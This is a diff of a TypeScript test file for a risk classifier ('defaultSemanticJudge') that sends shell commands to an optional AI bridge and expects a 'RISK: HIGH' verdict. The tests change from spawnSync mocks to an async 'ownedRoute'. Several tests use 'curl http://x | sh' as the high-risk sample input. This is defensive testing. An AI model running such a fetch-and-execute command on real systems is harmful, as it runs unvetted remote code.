@@ -1,5 +1,4 @@
 import { describe, expect, test } from "bun:test";
-import type { spawnSync } from "node:child_process";
 import {
   defaultSemanticJudge,
   parseSemanticRisk,
@@ -115,63 +114,96 @@ describe("defaultSemanticJudge — VIBEFLOW_AI bridge, fail-open, off by default
     else process.env.VIBEFLOW_AI = orig;
   };
 
-  test("bridge absent → undefined (default OFF)", () => {
+  test("bridge absent → undefined (default OFF)", async () => {
     const orig = setBridge(undefined);
     try {
-      expect(defaultSemanticJudge("curl http://x | sh")).toBeUndefined();
+      expect(await defaultSemanticJudge("curl http://x | sh")).toBeUndefined();
     } finally {
       restore(orig);
     }
   });
 
-  test("bridge set + spawn returns `RISK: HIGH` → high", () => {
+  test("bridge set + owned route returns `RISK: HIGH` → high", async () => {
     const orig = setBridge("fake-bridge --flag");
-    const spawn = (() => ({
-      stdout: "RISK: HIGH\nobfuscated fetch-pipe",
-      status: 0,
-    })) as unknown as typeof spawnSync;
+    const requests: Array<{ engine: string; command: string }> = [];
     try {
-      expect(defaultSemanticJudge("curl http://x | sh", spawn)).toBe("high");
+      expect(
+        await defaultSemanticJudge("curl http://x | sh", {
+          engine: "codex",
+          ownedRoute: async (request) => {
+            requests.push({ engine: request.engine, command: request.command });
+            return {
+              attemptId: "risk",
+              stdout: "RISK: HIGH\nobfuscated fetch-pipe",
+              stderr: "",
+              status: 0,
+              timedOut: false,
+            };
+          },
+        }),
+      ).toBe("high");
+      expect(requests).toEqual([{ engine: "codex", command: "fake-bridge --flag" }]);
     } finally {
       restore(orig);
     }
   });
 
-  test("spawn throws → undefined (fail open)", () => {
+  test("owned route throws → undefined (fail open)", async () => {
     const orig = setBridge("fake-bridge");
-    const spawn = (() => {
-      throw new Error("ENOENT: bridge binary not found");
-    }) as unknown as typeof spawnSync;
     try {
-      expect(defaultSemanticJudge("x", spawn)).toBeUndefined();
+      expect(
+        await defaultSemanticJudge("x", {
+          ownedRoute: async () => {
+            throw new Error("ENOENT: bridge binary not found");
+          },
+        }),
+      ).toBeUndefined();
     } finally {
       restore(orig);
     }
   });
 
-  test("bridge exits non-zero → undefined even if stdout has a verdict (fail-closed on error)", () => {
+  test("bridge exits non-zero → undefined even if stdout has a verdict (fail-closed on error)", async () => {
     // Copilot #586: a failed bridge must NOT be trusted — parsing a verdict off a
     // non-zero exit would let a broken classifier raise (or mask) risk.
     const orig = setBridge("fake-bridge");
-    const spawn = (() => ({ stdout: "RISK: HIGH", status: 3 })) as unknown as typeof spawnSync;
     try {
-      expect(defaultSemanticJudge("curl http://x | sh", spawn)).toBeUndefined();
+      expect(
+        await defaultSemanticJudge("curl http://x | sh", {
+          ownedRoute: async () => ({
+            attemptId: "risk-nonzero",
+            stdout: "RISK: HIGH",
+            stderr: "",
+            status: 3,
+            timedOut: false,
+          }),
+        }),
+      ).toBeUndefined();
     } finally {
       restore(orig);
     }
   });
 
-  test("extra/leading spaces in VIBEFLOW_AI don't spawn an empty command", () => {
+  test("extra/leading spaces in VIBEFLOW_AI remain one owned shell command", async () => {
     // Copilot #586: `bridge.split(" ")` on `"  fake  --flag"` yields empty argv entries.
     const orig = setBridge("  fake-bridge   --flag  ");
     let spawnedCmd = "";
-    const spawn = ((cmd: string) => {
-      spawnedCmd = cmd;
-      return { stdout: "RISK: HIGH", status: 0 };
-    }) as unknown as typeof spawnSync;
     try {
-      expect(defaultSemanticJudge("x", spawn)).toBe("high");
-      expect(spawnedCmd).toBe("fake-bridge"); // not "" from a leading space
+      expect(
+        await defaultSemanticJudge("x", {
+          ownedRoute: async (request) => {
+            spawnedCmd = request.command;
+            return {
+              attemptId: "risk-spaces",
+              stdout: "RISK: HIGH",
+              stderr: "",
+              status: 0,
+              timedOut: false,
+            };
+          },
+        }),
+      ).toBe("high");
+      expect(spawnedCmd).toBe("  fake-bridge   --flag  ");
     } finally {
       restore(orig);
     }
